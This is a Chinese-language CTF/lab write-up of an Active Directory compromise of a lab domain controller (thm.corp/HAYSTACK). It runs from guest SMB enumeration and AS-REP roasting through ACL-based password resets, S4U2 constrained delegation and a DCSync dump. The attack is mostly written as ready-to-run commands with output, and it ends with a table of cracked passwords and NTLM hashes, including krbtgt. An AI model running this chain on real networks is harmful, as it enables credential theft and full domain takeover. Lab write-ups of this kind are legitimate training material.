#### 攻击链路:

**匿名枚举 → AS-REP Roasting 拿到初始账号 → ACL 横向接力改密 → 约束委派 S4U2 → DCSync 拿域控**的链，没有常规口令喷洒直接拿下域管，靠 ACL 权限传递 + Kerberos 委派组合拿到域控权限。



### 细节:



- 目标: 10.144.137.72 / HAYSTACK / thm.corp / Windows Server 2019 Build 17763 / DC
- 预算工具: nxc v1.5.1, Impacket v0.13.1, bloodyAD, hashcat v8.0.0, bloodhound-ce-python

## 【1】端口扫描

```bash
rustscan -a 10.144.137.72 --ulimit 5000
# → 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49667-49698

nmap -Pn -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49667,49668,49669,49673,49675,49698 10.144.137.72
# → Domain: thm.corp, Host: HAYSTACK, signing: required
```

⚠️ nmap 必须加 `-Pn`，否则 ping 探测判主机 down。

## 【2】SMB guest 空口令枚举

```bash
# ★关键：是 guest 账号(用户名) + 空口令，不是空用户名 null session
nxc smb 10.144.137.72 -u 'guest' -p '' --shares
# → Data: READ,WRITE      ← 唯一可用共享
# → NETLOGON/SYSVOL 无权限

nxc smb 10.144.137.72 -u 'guest' -p '' --share Data --dir
nxc smb 10.144.137.72 -u 'guest' -p '' --share Data --dir onboarding
```

踩坑:

- `-u '' -p ''` (null session) 权限反而低，`--shares` 全部 ACCESS_DENIED
- `guest` 与 null session 是两条不同认证路径，权限差别巨大

## 【3】下载 onboarding 文件

```bash
cd /home/neon/loot3
smbclient.py -no-pass 'thm.corp/guest@10.144.137.72' -target-ip 10.144.137.72 <<'EOF'
use Data
cd onboarding
ls
get <当前文件名>.txt
get <当前文件名>.pdf
EOF
```

⚠️ 文件名每轮访问都轮转(靶机上有个 hook 在读目录时改名)，必须**同一条会话内 ls → 立即 get**。
踩过的坑(都是浪费):

- `nxc --get-file` → 大文件报 Error
- ## 【4】RID 爆破

```bash
nxc smb 10.144.137.72 -u 'guest' -p '' --rid-brute 3000 > rid_brute.txt
# → 41 域用户 + 组清单
grep SidTypeUser rid_brute.txt | awk -F'THM\\\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt
```

## 【5】口令复用喷洒

```bash
nxc smb 10.144.137.72 -u spray.txt -p 'ResetMe123!' --continue-on-success
# → LILY_ONEILL 唯一命中，但显示 (Guest) 降级
# → AUGUSTA_HAMILTON/HORACE_BOYLE/MARION_CLAY/MORGAN_SELLERS → STATUS_ACCOUNT_RESTRICTION
```

教训: `(Guest)` ≠ 认证成功。它意味着口令对但令牌被压到 Guest 以下。

## 【6】Kerberos 错误码判定账号状态 ★杀手锏

```bash
getTGT.py thm.corp/LILY_ONEILL:'ResetMe123!' -dc-ip 10.144.137.72
# → KDC_ERR_CLIENT_REVOKED  = 账号已禁用（口令正确）
# → KDC_ERR_C_PRINCIPAL_UNKNOWN = 账号不存在
# → KDC_ERR_PREAUTH_FAILED     = 账号存在但口令错
```

```bash
# LDAP 实时确认 UAC
ldapsearch -x -H ldap://10.144.137.72:389 -D 'TABATHA_BRITT@thm.corp' -w 'marlboro(1985)' \
  -b 'DC=thm,DC=corp' '(sAMAccountName=LILY_ONEILL)' userAccountControl
# → 66050 = 0x00010202 = ACCOUNT_DISABLE(0x2) | NORMAL_ACCOUNT(0x200) | DONT_EXPIRE_PASSWORD(0x10000)
```

结论: LILY 这条路彻底废弃 —— 不是权限问题，是账号状态。

## 【7】AS-REP Roasting

```bash
# 不需要任何凭据
GetNPUsers.py thm.corp/ -usersfile users.txt -dc-ip 10.144.137.72 -no-pass \
  -format hashcat -outputfile asrep_hashes.txt
# → 3 个 no-preauth 账号: ERNESTO_SILVA / LEANN_LONG / TABATHA_BRITT

hashcat -m 18200 -a 0 asrep_hashes.txt /home/neon/Desktop/rockyou.txt
# → TABATHA_BRITT : marlboro(1985)      ← 单独跑一个字典就出（1000万Pwdb没出，rockyou出了）
```

验证真实账号:

```bash
nxc smb 10.144.137.72 -u 'TABATHA_BRITT' -p 'marlboro(1985)'
# → [+] thm.corp\TABATHA_BRITT:marlboro(1985)   ← 没有 (Guest)! 真实有效域用户
```

## 【8】BloodHound 采集

```bash
bloodhound-ce-python -d thm.corp -u 'TABATHA_BRITT' -p 'marlboro(1985)' \
  -dc HAYSTACK.thm.corp -ns 10.144.137.72 -c All --zip -op bh_all
# → 42 users / 55 groups / 3 GPOs / 222 OUs / 1 computer(DC本身)
```

⚠️ CE 的 JSON 是 v6 格式: 字段在 `Properties`(大写) 里，ACE 在 `Aces` 里，`Members` 单列。

## 【9】ACL 分析（关键: 要展开组成员 SID）

```python
# 只看个人 SID 会漏掉组继承的权限！
# 正确做法: 主体自身 SID + 其所有所属组 SID 都要匹配
```

发现的链:

```
TABATHA --GenericAll--> SHAWNA_BRAY     (继承, 已利用)
TABATHA --GenericAll--> RAQUEL_BENSON   (未利用)
LILY_ONEILL ∈ ACCOUNT OPERATORS(-32-548) --GenericAll--> ELLIOT_CHARLES  (但 LILY 已禁用)
MARCELINO_BALLARD ∈ ACCOUNT OPERATORS  (唯一活着的 AO)
SHAWNA_BRAY --ForceChangePassword--> CRUZ_HALL
CRUZ_HALL --ForceChangePassword--> DARLA_WINTERS
```

## 【10】改密链

```bash
# GenericAll / ForceChangePassword 正确工具 = bloodyAD（不要用 changepasswd.py -reset，MS-RPC默认禁止）
bloodyAD -d thm.corp -u TABATHA_BRITT -p 'marlboro(1985)' -H 10.144.137.72 \
  set password SHAWNA_BRAY 'Pwn3d_Passw0rd!2026'

nxc rdp 10.144.137.72 -u 'SHAWNA_BRAY' -p 'Pwn3d_Passw0rd!2026'
# → [+] (Pwn3d!)   ← RDP 可用

bloodyAD -d thm.corp -u SHAWNA_BRAY -p 'Pwn3d_Passw0rd!2026' -H 10.144.137.72 \
  set password CRUZ_HALL 'ZZ99#AlphaLongPassword!' --stealth

bloodyAD -d thm.corp -u CRUZ_HALL -p 'ZZ99#AlphaLongPassword!' -H 10.144.137.72 \
  set password DARLA_WINTERS 'Wint3r#St0rm2026!X' --stealth
```

踩坑:

- `changepasswd.py -altuser -reset` → 两次 `Access denied`
- `bloodyAD set password` 不加 `--stealth` → `ERROR_PASSWORD_RESTRICTION`（密码策略/历史）
- 实际需要更复杂的长密码，试了 4 个才过

## 【11】S4U2 委派 → 域管

```bash
# DARLA_WINTERS: TrustedToAuth=True, 约束委派目标 = HAYSTACK$(SID ...-1008)
# 前提: DARLA 不在 Protected Users, sensitive=False

getST.py thm.corp/DARLA_WINTERS:'Wint3r#St0rm2026!X' \
  -spn cifs/haystack.thm.corp -impersonate Administrator -dc-ip 10.144.137.72 -k
# → Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```

踩坑:

- `-spn cifs/HAYSTACK` (短名) → secretsdump 报 `STATUS_MORE_PROCESSING_REQUIRED` / `STATUS_USER_SESSION_DELETED`
- **必须用 FQDN `cifs/haystack.thm.corp`**
- 还需要 `/etc/hosts` 里加 `10.144.137.72 HAYSTACK HAYSTACK.thm.corp thm.corp`
- 需要 `-target-ip` 显式指定

## 【12】DCSync / DRSUAPI

```bash
export KRB5CCNAME=$PWD/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
secretsdump.py -k -no-pass -dc-ip 10.144.137.72 haystack.thm.corp -just-dc > ntds_dump.txt
```

⚠️ 这台机器要先 `pkexec` 修 `/etc/hosts`，否则短名解析失败。

## 【13】域完全控制

- 41 用户 NTLM hash
- krbtgt hash (Golden Ticket 材料)
- 全部 Kerberos keys (aes256/aes128/des)

---

# 凭据汇总

| 账号              | 凭据                                    | 来源           | 用途                                   |
| ----------------- | --------------------------------------- | -------------- | -------------------------------------- |
| Administrator     | NTLM `067a84e5afaed843ed4a8fdac5facac3` | NTDS           | 登录受限(STATUS_ACCOUNT_RESTRICTION)   |
| krbtgt            | NTLM `ce852eb247bbe2e5818cd8d66ed19ec5` | NTDS           | GT 材料(此环境 PAC 校验会 TGT_REVOKED) |
| TABATHA_BRITT     | `marlboro(1985)`                        | AS-REP+rockyou | ★主立足点                              |
| SHAWNA_BRAY       | `Pwn3d_Passw0rd!2026`                   | 我改的         | RDP Pwn3d!                             |
| CRUZ_HALL         | `ZZ99#AlphaLongPassword!`               | 我改的         | 接力改密                               |
| DARLA_WINTERS     | `Wint3r#St0rm2026!X`                    | 我改的         | T2A+约束委派→域管                      |
| ELLIOT_CHARLES    | NTLM `b1742442ac0e99f0175d48c763d1c499` | NTDS           | RMU 成员                               |
| AUTOMATE          | NTLM `5858d47a41e40b40f294b3100bea611f` | NTDS           | RMU 成员                               |
| 3811465497SA      | NTLM `eb0885d1955f642d2ae09b8d6944d69e` | NTDS           | RMU 成员                               |
| MARCELINO_BALLARD | NTLM `fbcee21eab6256be6d3d6257cc0ae4a2` | NTDS           | 唯一活着的 Account Operator            |
| LILY_ONEILL       | `ResetMe123!`                           | onboarding txt | ❌ 账号禁用,此路废弃                    |

---

# 走过的弯路（下次别踩）

| 弯路                                      | 教训                                                                  |
| ----------------------------------------- | --------------------------------------------------------------------- |
| 把 `guest` 当 `-u ''` 测                  | null session ≠ guest 账号，权限天差地别                               |
| `nxc --shares` guest vs LILY 对照搞错对象 | 先确认认证路径再加结论                                                |
|                                           |                                                                       |
|                                           |                                                                       |
| `changepasswd.py -altuser -reset`         | GenericAll 改密用 `bloodyAD set password --stealth`                   |
| 密码不合规被拒                            | 先读密码策略(complexity/minage/history)，预处理密码                   |
| BloodHound JSON 解析                      | v6 格式 + **ACE 要展开组成员 SID**，否则漏链                          |
| Responder + coerce 投入过多               | 只捞到机器账户 hash，破不动；DC 强制签名不能 relay。优先查 RMU/改密链 |
| Golden Ticket 试两次                      | NTDS 已在手，GT 多余；且此环境 PAC 校验会 TGT_REVOKED                 |
| `-spn cifs/HAYSTACK` 短名                 | S4U 票据必须用 FQDN                                                   |

# 精简工具链（8 个工具跑通）

```
rustscan + nmap -Pn -sV -sC
  → nxc smb -u guest -p '' --shares/--rid-brute/--dir
  → smbclient.py (单会话 ls+get)
  → getTGT.py (错误码判定账号状态)
  → GetNPUsers.py + hashcat -m 18200 rockyou
  → bloodhound-ce-python -c All (+ 手工解析时展开组成员)
  → bloodyAD set password --stealth
  → getST.py (T2A+约束委派)
  → secretsdump.py -k -no-pass -just-dc
```
